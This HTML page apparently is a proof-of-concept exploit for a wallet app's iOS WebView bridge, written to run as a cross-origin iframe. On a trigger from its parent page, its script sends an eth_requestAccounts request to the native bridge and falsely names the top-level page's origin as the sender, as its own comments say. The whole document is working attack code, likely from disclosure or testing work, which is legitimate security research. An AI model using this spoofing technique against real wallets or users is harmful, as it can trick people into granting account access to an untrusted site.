<!doctype html>
<meta charset="utf-8">

Cross-origin Origin B iframe.

<script>
const topOrigin =
  new URLSearchParams(location.search).get('topOrigin');

if (!topOrigin || new URL(topOrigin).origin !== topOrigin) {
  throw new Error('Invalid topOrigin');
}

function requestWallet() {
  const message = JSON.stringify({
    method: 'provider_request',

    payload: JSON.stringify({
      id: 424242,

      // Actual sender = Origin B
      // Claimed sender = Origin A
      origin: topOrigin,

      request: {
        method: 'eth_requestAccounts',
        params: []
      }
    })
  });

  const bridge =
    window.webkit?.messageHandlers?.ReactNativeWebView;

  if (!bridge?.postMessage) {
    throw new Error('Core iOS native bridge unavailable');
  }

  bridge.postMessage(message);

  parent.postMessage('SENT', topOrigin);
}

addEventListener('message', event => {
  if (event.source !== parent) return;
  if (event.origin !== topOrigin) return;
  if (event.data !== 'TRIGGER') return;

  requestWallet();
});

parent.postMessage('READY', topOrigin);
</script>
